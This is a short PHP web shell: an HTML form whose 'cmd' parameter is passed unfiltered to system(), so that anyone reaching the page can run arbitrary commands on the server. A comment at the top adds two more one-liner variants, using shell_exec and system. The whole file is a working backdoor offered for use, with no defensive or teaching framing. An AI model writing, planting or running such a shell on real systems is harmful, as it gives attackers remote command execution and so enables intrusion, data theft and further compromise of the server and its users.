<?
	/* basic oneliner: <?php echo shell_exec($_GET['c'].' 2>&1'); ?>
	   tiny oneliner: <?php system($_GET['c']); ?> */
?>

<html>
	<body>
	<form method="GET" name="myform" action="">
		<input type="text" name="cmd">
		<input type="submit" value="Send">
	</form>
	<pre>
		<?
		if($_GET['cmd']) {
		  system($_GET['cmd']);
		  }
		?>
	</pre>
	</body>
</html>
